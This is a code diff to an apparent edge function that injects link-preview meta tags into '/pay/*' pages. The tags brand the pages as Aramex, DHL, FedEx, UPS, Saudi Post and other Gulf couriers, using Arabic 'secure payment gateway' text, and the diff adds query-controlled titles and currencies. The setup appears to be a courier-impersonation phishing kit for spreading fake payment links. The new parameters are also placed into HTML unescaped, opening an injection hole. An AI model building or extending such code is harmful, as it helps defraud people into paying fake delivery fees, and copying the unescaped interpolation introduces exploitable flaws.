@@ -6,6 +6,8 @@ export default async function handler(request: Request, context: { next: () => P
     // Get the URL and query parameters
     const url = new URL(request.url);
     const company = url.searchParams.get('company') || 'aramex';
+    const title = url.searchParams.get('title');
+    const currency = url.searchParams.get('currency');
     const path = url.pathname;
 
     // Only process /pay/* paths
@@ -13,35 +15,38 @@ export default async function handler(request: Request, context: { next: () => P
       return context.next();
     }
 
-    console.log('OG Injector: Processing', { path, company });
+    console.log('OG Injector: Processing', { path, company, title, currency });
 
     // Fetch the original HTML
     const response = await context.next();
     const html = await response.text();
 
-    // Company to OG image mapping
+    // Get the current domain dynamically
+    const origin = url.origin;
+
+    // Company to OG image mapping (using correct .jpg extension and dynamic domain)
     const companyImages: Record<string, string> = {
-      'aramex': 'https://gulf-unified-payment.netlify.app/og/aramex.png',
-      'dhl': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
-      'dhlkw': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
-      'dhlqa': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
-      'dhlom': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
-      'dhlbh': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
-      'fedex': 'https://gulf-unified-payment.netlify.app/og/fedex.png',
-      'ups': 'https://gulf-unified-payment.netlify.app/og/ups.png',
-      'empost': 'https://gulf-unified-payment.netlify.app/og/empost.png',
-      'smsa': 'https://gulf-unified-payment.netlify.app/og/smsa.png',
-      'zajil': 'https://gulf-unified-payment.netlify.app/og/zajil.png',
-      'naqel': 'https://gulf-unified-payment.netlify.app/og/naqel.png',
-      'saudipost': 'https://gulf-unified-payment.netlify.app/og/saudipost.png',
-      'kwpost': 'https://gulf-unified-payment.netlify.app/og/kwpost.png',
-      'qpost': 'https://gulf-unified-payment.netlify.app/og/qpost.png',
-      'omanpost': 'https://gulf-unified-payment.netlify.app/og/omanpost.png',
-      'bahpost': 'https://gulf-unified-payment.netlify.app/og/bahpost.png'
+      'aramex': `${origin}/og-aramex.jpg`,
+      'dhl': `${origin}/og-dhl.jpg`,
+      'dhlkw': `${origin}/og-dhl.jpg`,
+      'dhlqa': `${origin}/og-dhl.jpg`,
+      'dhlom': `${origin}/og-dhl.jpg`,
+      'dhlbh': `${origin}/og-dhl.jpg`,
+      'fedex': `${origin}/og-fedex.jpg`,
+      'ups': `${origin}/og-ups.jpg`,
+      'empost': `${origin}/og-empost.jpg`,
+      'smsa': `${origin}/og-smsa.jpg`,
+      'zajil': `${origin}/og-zajil.jpg`,
+      'naqel': `${origin}/og-naqel.jpg`,
+      'saudipost': `${origin}/og-saudipost.jpg`,
+      'kwpost': `${origin}/og-kwpost.jpg`,
+      'qpost': `${origin}/og-qpost.jpg`,
+      'omanpost': `${origin}/og-omanpost.jpg`,
+      'bahpost': `${origin}/og-bahpost.jpg`
     };
 
-    // Get OG image for the company, fallback to default
-    const ogImage = companyImages[company.toLowerCase()] || 'https://gulf-unified-payment.netlify.app/og/default.png';
+    // Get OG image for the company, fallback to aramex
+    const ogImage = companyImages[company.toLowerCase()] || `${origin}/og-aramex.jpg`;
 
     // Company display names
     const companyNames: Record<string, string> = {
@@ -66,23 +71,32 @@ export default async function handler(request: Request, context: { next: () => P
 
     const companyName = companyNames[company.toLowerCase()] || company;
 
+    // Generate dynamic title and description
+    const ogTitle = title || `${companyName} - إكمال الدفع`;
+    const ogDescription = currency
+      ? `إكمال دفع ${companyName} بـ ${currency} - بوابة دفع آمنة وموثوقة`
+      : `إكمال دفع ${companyName} - بوابة دفع آمنة وموثوقة`;
+    const ogUrl = url.href;
+
     // Generate OG meta tags
     const ogTags = `
     <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="${companyName} Payment - Complete your payment" />
-    <meta property="og:description" content="Complete your payment with ${companyName} - Secure and reliable payment gateway" />
+    <meta property="og:url" content="${ogUrl}" />
+    <meta property="og:title" content="${ogTitle}" />
+    <meta property="og:description" content="${ogDescription}" />
     <meta property="og:image" content="${ogImage}" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
-    <meta property="og:image:type" content="image/png" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:alt" content="${companyName} Payment Gateway" />
     <meta property="og:site_name" content="Gulf Payment Gateway" />
     <meta property="og:locale" content="ar_AR" />
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="${companyName} Payment - Complete your payment" />
-    <meta name="twitter:description" content="Complete your payment with ${companyName} - Secure and reliable payment gateway" />
+    <meta name="twitter:title" content="${ogTitle}" />
+    <meta name="twitter:description" content="${ogDescription}" />
     <meta name="twitter:image" content="${ogImage}" />
     <meta name="twitter:image:alt" content="${companyName} Payment Gateway" />
     `;
@@ -103,7 +117,7 @@ export default async function handler(request: Request, context: { next: () => P
       (match) => `${match}\n${ogTags.trim()}`
     );
 
-    console.log('OG Injector: Injected tags for', { company, ogImage });
+    console.log('OG Injector: Injected tags for', { company, currency, title: ogTitle, ogImage });
 
     // Return modified HTML with same headers
     return new Response(modifiedHtml, {
